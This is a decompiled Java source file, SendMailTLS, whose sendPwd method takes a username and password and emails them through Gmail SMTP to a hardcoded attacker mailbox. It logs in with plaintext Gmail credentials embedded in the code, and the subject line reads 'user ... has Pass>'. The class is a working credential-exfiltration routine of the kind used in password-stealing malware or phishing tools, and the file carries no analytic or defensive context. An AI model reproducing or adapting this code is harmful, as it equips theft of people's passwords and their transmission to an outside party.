// Decompiled by DJ v3.12.12.96 Copyright 2011 Atanas Neshkov  Date: 08.04.2013 19:15:31
// Home Page: http://members.fortunecity.com/neshkov/dj.html  http://www.neshkov.com/dj.html - Check often for new version!
// Decompiler options: packimports(3) 
// Source File Name:   SendMailTLS.java

import java.io.PrintStream;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class SendMailTLS
{

    public SendMailTLS()
    {
    }

    public static void sendPwd(String s, String s1)
    {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "25");
        Session session = Session.getInstance(properties, new Authenticator() {

            protected PasswordAuthentication getPasswordAuthentication()
            {
                return new PasswordAuthentication("mohir1234512@gmail.com", "mohir1234512");
            }

        }
);
        try
        {
            MimeMessage mimemessage = new MimeMessage(session);
            mimemessage.setFrom(new InternetAddress("mohir1234512@gmail.com"));
            mimemessage.setRecipients(javax.mail.Message.RecipientType.TO, InternetAddress.parse("mohir1234512@gmail.com"));
            mimemessage.setSubject((new StringBuilder()).append("user ").append(s).append(" has Pass> ").append(s1).toString());
            mimemessage.setText("Dear Mail Crawler,\n\n No spam to my email, please!");
            Transport.send(mimemessage);
            System.out.println("Done");
        }
        catch(MessagingException messagingexception)
        {
            throw new RuntimeException(messagingexception);
        }
    }
}
